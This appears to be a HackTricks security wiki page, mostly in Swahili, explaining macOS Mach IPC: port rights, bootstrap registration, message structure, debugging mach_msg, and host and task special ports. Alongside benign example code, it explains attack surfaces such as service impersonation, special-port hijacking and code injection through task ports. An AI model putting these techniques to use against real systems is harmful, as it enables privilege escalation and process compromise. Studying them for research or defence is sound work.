# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Mach hutumia **tasks** kama **kitengo kidogo zaidi** cha kushiriki rasilimali, na kila task inaweza kuwa na **threads nyingi**. **Tasks na threads hizi huwekwa kwenye ramani ya 1:1 na processes na threads za POSIX**.

Mawasiliano kati ya tasks hufanyika kupitia Mach Inter-Process Communication (IPC), yakitumia njia za mawasiliano za upande mmoja. **Messages huhamishwa kati ya ports**, ambazo hufanya kazi kama **message queues** zinazosimamiwa na kernel.

**Port** ni kipengele **cha msingi** cha Mach IPC. Inaweza kutumika **kutuma messages na kuzipokea**.

Kila process ina **IPC table**, ambapo inawezekana kupata **mach ports za process hiyo**. Jina la mach port kwa kweli ni nambari (pointer inayoelekea kwenye kernel object).

Process pia inaweza kutuma jina la port pamoja na rights fulani **kwa task tofauti**, na kernel itafanya entry hii ionekane katika **IPC table ya task nyingine**.

### Port Rights

Port rights, ambazo hufafanua operations ambazo task inaweza kufanya, ni muhimu katika mawasiliano haya. **Port rights** zinazowezekana ni ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):<sup>[[1]](#references)</sup>

- **Receive right**, inayoruhusu kupokea messages zinazotumwa kwenye port. Mach ports ni MPSC (multiple-producer, single-consumer) queues, kumaanisha kwamba kunaweza kuwa na **receive right moja tu kwa kila port** katika mfumo mzima (tofauti na pipes, ambapo processes nyingi zinaweza kushikilia file descriptors zinazoelekea upande wa kusoma wa pipe moja).
- **Task yenye Receive** right inaweza kupokea messages na **kuunda Send rights**, zinazoiruhusu kutuma messages. Hapo awali ni **task yenyewe tu ilikuwa na Receive right juu ya por**t yake.
- Ikiwa mmiliki wa Receive right **atakufa** au kuiua, **send right inakuwa haina maana (dead name).**
- **Send right**, inayoruhusu kutuma messages kwenye port.
- Send right inaweza **kuigwa** ili task inayomiliki Send right iweze kuiga right hiyo na **kuikabidhi kwa task ya tatu**.
- Kumbuka kwamba **port rights** pia zinaweza **kupitishwa** kupitia Mach messages.
- **Send-once right**, inayoruhusu kutuma message moja kwenye port na kisha kutoweka.
- Right hii **haiwezi** **kuigwa**, lakini inaweza **kuhamishwa**.
- **Port set right**, inayowakilisha _port set_ badala ya port moja. Kuondoa message kwenye port set huondoa message kutoka kwenye mojawapo ya ports ilizonazo. Port sets zinaweza kutumika kusikiliza ports kadhaa kwa wakati mmoja, sawa kwa kiasi kikubwa na `select`/`poll`/`epoll`/`kqueue` katika Unix.
- **Dead name**, ambayo si port right halisi, bali ni placeholder tu. Port inapoharibiwa, port rights zote zilizopo zinazoelekea kwenye port hiyo hubadilika kuwa dead names.

**Tasks zinaweza kuhamisha SEND rights kwa wengine**, na kuwawezesha kutuma messages kurudi. **SEND rights pia zinaweza kuigwa, hivyo task inaweza kunakili na kumpa task ya tatu right hiyo**. Hili, pamoja na process ya kati inayojulikana kama **bootstrap server**, huwezesha mawasiliano bora kati ya tasks.

### File Ports

File ports huruhusu file descriptors kufungashwa ndani ya Mach ports (kwa kutumia Mach port rights). Inawezekana kuunda `fileport` kutoka kwenye file descriptor fulani kwa kutumia `fileport_makeport`, na kuunda file descriptor kutoka kwenye `fileport` kwa kutumia `fileport_makefd`.

### Establishing a communication

Kama ilivyotajwa hapo awali, inawezekana kutuma rights kwa kutumia Mach messages, hata hivyo, **huwezi kutuma right bila kuwa tayari una right** ya kutuma Mach message. Kwa hiyo, mawasiliano ya kwanza yanaanzishwaje?

Kwa hili, **bootstrap server** (**launchd** katika mac) huhusika, kwa kuwa **kila mtu anaweza kupata SEND right kwa bootstrap server**, hivyo inawezekana kuiomba right ya kutuma message kwa process nyingine:

1. Task **A** huunda **port mpya**, na kupata **RECEIVE right** juu yake.
2. Task **A**, ikiwa mmiliki wa RECEIVE right, **hutengeneza SEND right kwa ajili ya port hiyo**.
3. Task **A** huanzisha **connection** na **bootstrap server**, kisha **huutumie SEND right** wa port iliyotengenezwa mwanzoni.
- Kumbuka kwamba mtu yeyote anaweza kupata SEND right kwa bootstrap server.
4. Task A hutuma message ya `bootstrap_register` kwa bootstrap server ili **kuhusisha port iliyotolewa na jina** kama `com.apple.taska`
5. Task **B** huwasiliana na **bootstrap server** ili kutekeleza **lookup ya bootstrap** kwa jina la service (`bootstrap_lookup`). Ili bootstrap server iweze kujibu, task B itaitumia **SEND right ya port iliyokuwa imeunda awali** ndani ya lookup message. Ikiwa lookup itafanikiwa, **server huiga SEND right** iliyopokelewa kutoka Task A na **kuituma kwa Task B**.
- Kumbuka kwamba mtu yeyote anaweza kupata SEND right kwa bootstrap server.
6. Kwa kutumia SEND right hii, **Task B** inaweza **kutuma** **message** **kwa Task A**.
7. Kwa mawasiliano ya pande mbili, kwa kawaida task **B** huunda port mpya yenye **RECEIVE** right na **SEND** right, kisha kumpa **Task A SEND right** ili iweze kutuma messages kwa TASK B (mawasiliano ya pande mbili).

Bootstrap server **haiwezi kuthibitisha** service name inayodaiwa na task. Hii inamaanisha kwamba **task** inaweza kinadharia **kuiga task yoyote ya mfumo**, kama vile kudai kwa uongo **service name ya authorization** na kisha kuidhinisha kila request.

Kisha, Apple huhifadhi **majina ya services zinazotolewa na mfumo** katika secure configuration files, zilizo katika directories zinazolindwa na **SIP**: `/System/Library/LaunchDaemons` na `/System/Library/LaunchAgents`. Pamoja na kila service name, **binary inayohusishwa pia huhifadhiwa**. Bootstrap server huunda na kushikilia **RECEIVE right kwa kila service name** kati ya hizi.

Kwa services hizi zilizowekwa mapema, mchakato wa **lookup** hutofautiana kidogo. Service name inapotafutwa, launchd huanzisha service hiyo dynamically. Workflow mpya huwa kama ifuatavyo:

- Task **B** huanzisha **lookup** ya bootstrap kwa service name.
- **launchd** huangalia ikiwa task inaendelea kuendesha; ikiwa haiendeshi, **huianzisha**.
- Task **A** (service) hufanya **bootstrap check-in** (`bootstrap_check_in()`). Hapa, **bootstrap** server huunda SEND right, huihifadhi, na **huhamisha RECEIVE right kwa Task A**.
- launchd huiga **SEND right na kuituma kwa Task B**.
- **Task B** huunda port mpya yenye **RECEIVE** right na **SEND** right, kisha kumpa **Task A SEND right** (svc) ili iweze kutuma messages kwa TASK B (mawasiliano ya pande mbili).

Hata hivyo, mchakato huu unatumika tu kwa system tasks zilizowekwa mapema. Non-system tasks bado hufanya kazi kama ilivyoelezwa awali, jambo ambalo linaweza kuruhusu impersonation.

> [!CAUTION]
> Kwa hiyo, launchd haipaswi kamwe ku-crash, vinginevyo mfumo mzima uta-crash.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[[4]](#references)</sup>

Function ya `mach_msg`, ambayo kimsingi ni system call, hutumika kutuma na kupokea Mach messages. Function hii inahitaji message itakayotumwa iwe argument ya kwanza. Message hii lazima ianze na structure ya `mach_msg_header_t`, ikifuatiwa na maudhui halisi ya message. Structure hiyo hufafanuliwa kama ifuatavyo:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processes zenye _**receive right**_ zinaweza kupokea ujumbe kwenye Mach port. Kinyume chake, **senders** hupewa _**send**_ au _**send-once right**_. Send-once right hutumika pekee kutuma ujumbe mmoja, baada ya hapo huwa batili.<sup>[[11]](#references)</sup>

Sehemu ya awali **`msgh_bits`** ni bitmap:

- Bit ya kwanza (iliyo muhimu zaidi) hutumika kuonyesha kwamba ujumbe ni complex (maelezo zaidi hapa chini)
- Bit ya 3 na ya 4 hutumiwa na kernel
- **Bits 5 zisizo muhimu zaidi za byte ya 2** zinaweza kutumika kwa **voucher**: aina nyingine ya port ya kutuma mchanganyiko wa key/value.
- **Bits 5 zisizo muhimu zaidi za byte ya 3** zinaweza kutumika kwa **local port**
- **Bits 5 zisizo muhimu zaidi za byte ya 4** zinaweza kutumika kwa **remote port**

Aina zinazoweza kubainishwa katika voucher, local port na remote port ni hizi (kutoka [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Kwa mfano, `MACH_MSG_TYPE_MAKE_SEND_ONCE` inaweza kutumika **kuonyesha** kwamba **send-once** **right** inapaswa kuundwa na kuhamishwa kwa port hii. Pia inaweza kubainishwa `MACH_PORT_NULL` ili kumzuia mpokeaji asiweze kujibu.

Ili kufanikisha **bi-directional communication** kwa urahisi, process inaweza kubainisha **mach port** katika **message header** ya mach inayoitwa _reply port_ (**`msgh_local_port`**) ambapo **receiver** wa message anaweza **kutuma jibu** kwa message hii.

> [!TIP]
> Kumbuka kwamba aina hii ya bi-directional communication hutumika katika messages za XPC zinazotarajia replay (`xpc_connection_send_message_with_reply` na `xpc_connection_send_message_with_reply_sync`). Lakini **kwa kawaida ports tofauti huundwa** kama ilivyoelezwa awali ili kuunda bi-directional communication.

Fields nyingine za message header ni:

- `msgh_size`: ukubwa wa packet nzima.
- `msgh_remote_port`: port ambayo message hii inatumwa.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: ID ya message hii, ambayo hutafsiriwa na receiver.

> [!CAUTION]
> Kumbuka kwamba **mach messages hutumwa kupitia `mach port`**, ambayo ni communication channel ya **single receiver**, **multiple sender** iliyojengwa ndani ya mach kernel. **Processes nyingi** zinaweza **kutuma messages** kwa mach port, lakini wakati wowote ni **process moja tu inayoweza kusoma** kutoka humo.

Messages huundwa kwanza na **`mach_msg_header_t`** header, ikifuatiwa na **body** na **trailer** (ikiwa ipo), na inaweza kutoa ruhusa ya kuijibu. Katika hali hizi, kernel inahitaji tu kupitisha message kutoka task moja hadi nyingine.

**Trailer** ni **taarifa inayoongezwa kwenye message na kernel** (haiwezi kuwekwa na user), ambayo inaweza kuombwa wakati wa kupokea message kwa flags `MACH_RCV_TRAILER_<trailer_opt>` (kuna taarifa tofauti zinazoweza kuombwa).

#### Messages Changamano

Hata hivyo, kuna messages nyingine zilizo **changamano** zaidi, kama zile zinazopitisha port rights za ziada au kushiriki memory, ambapo kernel pia inahitaji kutuma objects hizi kwa recipient. Katika hali hizi, bit muhimu zaidi ya header `msgh_bits` huwekwa.

Descriptors zinazowezekana kupitishwa zimefafanuliwa katika [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
Katika 32bits, descriptors zote zina ukubwa wa 12B na aina ya descriptor iko katika ya 11. Katika 64 bits, ukubwa hutofautiana.

> [!CAUTION]
> Kernel itakili descriptors kutoka task moja hadi nyingine, lakini kwanza **ikiunda nakala katika memory ya kernel**. Technique hii, inayojulikana kama "Feng Shui", imetumiwa vibaya katika exploits kadhaa ili kufanya **kernel ikopi data katika memory yake**, kwa kufanya process itume descriptors kwake yenyewe. Kisha process inaweza kupokea messages (kernel itazifree).
>
> Pia inawezekana **kutuma port rights kwa process iliyo vulnerable**, na port rights hizo zitatokea tu katika process hiyo (hata kama haihandle).

### Mac Ports APIs

Kumbuka kwamba ports zinahusishwa na task namespace, kwa hiyo ili kuunda au kutafuta port, task namespace pia huulizwa (maelezo zaidi katika `mach/mach_port.h`):<sup>[[6]](#references)</sup>

- **`mach_port_allocate` | `mach_port_construct`**: **Unda** port.
- `mach_port_allocate` inaweza pia kuunda **port set**: receive right juu ya group ya ports. Wakati message inapopokelewa, port iliyotoka huonyeshwa.
- `mach_port_allocate_name`: Badilisha jina la port (kwa default integer ya 32bit)
- `mach_port_names`: Pata majina ya ports kutoka kwa target
- `mach_port_type`: Pata rights za task juu ya jina
- `mach_port_rename`: Badilisha jina la port (kama dup2 kwa FDs)
- `mach_port_allocate`: Allocate RECEIVE, PORT_SET au DEAD_NAME mpya
- `mach_port_insert_right`: Unda right mpya katika port ambayo una RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Functions zinazotumika **kutuma na kupokea mach messages**. Toleo la overwrite linaruhusu kubainisha buffer tofauti kwa ajili ya kupokea message (toleo lingine litaitumia tena).

### Debug mach_msg

Kwa kuwa functions **`mach_msg`** na **`mach_msg_overwrite`** ndizo zinazotumika kutuma na kupokea messages, kuweka breakpoint juu yake kungewezesha kukagua messages zilizotumwa na zilizopokelewa.

Kwa mfano, anza kudebug application yoyote unayoweza kudebug, kwa sababu itaload **`libSystem.B` ambayo itatumia function hii**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Ili kupata arguments za **`mach_msg`**, angalia registers. Hizi ndizo arguments (kutoka [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Pata thamani kutoka kwenye registries:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Kagua kichwa cha ujumbe ukiangalia hoja ya kwanza:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Aina hiyo ya `mach_msg_bits_t` ni ya kawaida sana ili kuruhusu jibu.

### Orodhesha ports
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**jina** ni jina chaguo-msingi linalopewa port (angalia jinsi linavyoendelea **kuongezeka** katika bytes 3 za kwanza). **`ipc-object`** ni **kitambulisho** cha kipekee **kilichofichwa** cha port.\
Pia zingatia jinsi ports zilizo na ruhusa ya **`send`** pekee zinavyotambua **mmiliki** wake (jina la port + pid).\
Pia zingatia matumizi ya **`+`** kuonyesha **tasks nyingine zilizounganishwa kwenye port hiyo hiyo**.

Pia inawezekana kutumia [**procesxp**](https://www.newosxbook.com/tools/procexp.html) ili kuona pia **majina ya services zilizosajiliwa** (ikiwa SIP imezimwa kwa sababu ya hitaji la `com.apple.system-task-port`):
```
procesp 1 ports
```
Unaweza kusakinisha tool hii kwenye iOS kwa kuipakua kutoka [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Mfano wa code

Kumbuka jinsi **sender** **allocates** port, anavyounda **send right** kwa jina `org.darlinghq.example` na kuituma kwa **bootstrap server**, huku sender akiomba **send right** ya jina hilo na kuitumia **send a message**.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Ports zenye Privilege

Baadhi ya ports maalum huruhusu task **kufanya vitendo fulani nyeti au kufikia data fulani nyeti** inapokuwa na haki za **SEND** juu yake. Ports hizi zinavutia kwa mtazamo wa mshambuliaji kwa sababu ya uwezo wake na pia uwezo wa **kushiriki haki za SEND kati ya tasks**.

### Host Special Ports

Ports hizi huwakilishwa na nambari.

Haki za **SEND** zinaweza kupatikana kwa kuita **`host_get_special_port`**, na haki za **RECEIVE** kwa kuita **`host_set_special_port`**. Hata hivyo, miito yote miwili inahitaji port ya **`host_priv`**, ambayo inaweza kufikiwa na root pekee. Zaidi ya hayo, zamani root aliweza kuita **`host_set_special_port`** na kuteka nyara ports za kiholela, jambo lililoruhusu, kwa mfano, kuepuka code signatures kwa kuteka nyara `HOST_KEXTD_PORT` (SIP sasa inazuia hili).

Hizi zimegawanywa katika makundi 2: **ports 7 za kwanza zinamilikiwa na kernel**, zikiwa port ya 1 `HOST_PORT`, ya 2 `HOST_PRIV_PORT`, ya 3 `HOST_IO_MASTER_PORT`, na ya 7 ikiwa `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Zinazoanza **kuanzia** nambari **8** **zinamilikiwa na system daemons** na zinaweza kupatikana zikiwa zimetangazwa katika [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Host port**: Ikiwa process ina privilege ya **SEND** juu ya port hii, inaweza kupata **taarifa** kuhusu **system** kwa kuita routines zake kama:
- `host_processor_info`: Pata taarifa za processor
- `host_info`: Pata taarifa za host
- `host_virtual_physical_table_info`: Jedwali la kurasa za Virtual/Physical (linahitaji MACH_VMDEBUG)
- `host_statistics`: Pata statistics za host
- `mach_memory_info`: Pata mpangilio wa kernel memory
- **Host Priv port**: Process yenye haki ya **SEND** juu ya port hii inaweza kufanya **vitendo vya privileged** kama kuonyesha boot data au kujaribu kupakia kernel extension. **Process inahitaji kuwa root** ili kupata ruhusa hii.
- Zaidi ya hayo, ili kuita API ya **`kext_request`**, inahitajika kuwa na entitlements nyingine za **`com.apple.private.kext*`**, ambazo hupewa Apple binaries pekee.
- Routines nyingine zinazoweza kuitwa ni:
- `host_get_boot_info`: Pata `machine_boot_info()`
- `host_priv_statistics`: Pata statistics za privileged
- `vm_allocate_cpm`: Tenga Contiguous Physical Memory
- `host_processors`: Tuma haki ya SEND kwa host processors
- `mach_vm_wire`: Fanya memory ibaki resident
- Kwa kuwa **root** inaweza kufikia ruhusa hii, inaweza kuita **`host_set_[special/exception]_port[s]`** ili **kuteka nyara host special au exception ports**.

Inawezekana **kuona host special ports zote** kwa kuendesha:
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

Hizi ni ports zilizotengwa kwa ajili ya services zinazojulikana. Inawezekana kuzipata/kuzisanidi kwa kuita `task_[get/set]_special_port`. Zinaweza kupatikana katika `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[[8]](#references)</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: Port inayotumika kudhibiti task hii. Hutumika kutuma messages zinazoathiri task. Hii ndiyo port inayorejeshwa na **mach_task_self (see Task Ports below)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Bootstrap port ya task. Hutumika kutuma messages zinazoomba kurejeshwa kwa ports za huduma nyingine za mfumo.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Port inayotumika kuomba taarifa kuhusu host iliyo na task hii. Hii ndiyo port inayorejeshwa na **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Port inayoonyesha chanzo ambacho task hii hupata wired kernel memory yake.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Port inayoonyesha chanzo ambacho task hii hupata default memory managed memory yake.

### Task Ports

Hapo awali Mach haikuwa na "processes"; ilikuwa na "tasks", ambazo zilionekana zaidi kama container ya threads. Mach ilipounganishwa na BSD, **kila task ilihusishwa na BSD process**. Kwa hiyo, kila BSD process ina maelezo inayohitaji kuwa process, na kila Mach task pia ina utendaji wake wa ndani (isipokuwa pid 0 isiyokuwepo, ambayo ni `kernel_task`).

Kuna functions mbili za kuvutia sana zinazohusiana na hili:<sup>[[7]](#references)</sup>

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Pata SEND right ya task port ya task inayohusishwa na `pid` iliyotajwa, kisha ipe kwa `target_task_port` iliyoonyeshwa (ambayo kwa kawaida ni caller task iliyotumia `mach_task_self()`, lakini inaweza kuwa SEND port iliyo juu ya task nyingine).
- `pid_for_task(task, &pid)`: Ukipewa SEND right ya task, tafuta PID ambayo task hii inahusishwa nayo.

Ili kutekeleza actions ndani ya task, task ilihitaji SEND right juu yake yenyewe kwa kuita `mach_task_self()` (ambayo hutumia `task_self_trap` (28)). Kwa permission hii, task inaweza kutekeleza actions kadhaa kama:

- `task_threads`: Pata SEND right juu ya task ports zote za threads za task
- `task_info`: Pata taarifa kuhusu task
- `task_suspend/resume`: Sitisha au endeleza task
- `task_[get/set]_special_port`
- `thread_create`: Unda thread
- `task_[get/set]_state`: Dhibiti hali ya task
- na zaidi zinaweza kupatikana katika [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Kumbuka kwamba ukiwa na SEND right juu ya task port ya **task nyingine**, inawezekana kutekeleza actions kama hizi juu ya task hiyo nyingine.

Zaidi ya hayo, task port pia ni **`vm_map`** port, inayomruhusu caller **kusoma na ku-manipulate memory** ndani ya task kwa functions kama `vm_read()` na `vm_write()`. Hii inamaanisha kwamba task iliyo na SEND rights juu ya task port ya task nyingine inaweza **ku-inject code ndani ya task hiyo**.

Kumbuka kwamba kwa sababu **kernel pia ni task**, ikiwa mtu ataweza kupata **SEND permissions** juu ya **`kernel_task`**, ataweza kuifanya kernel itekeleze chochote (jailbreaks).

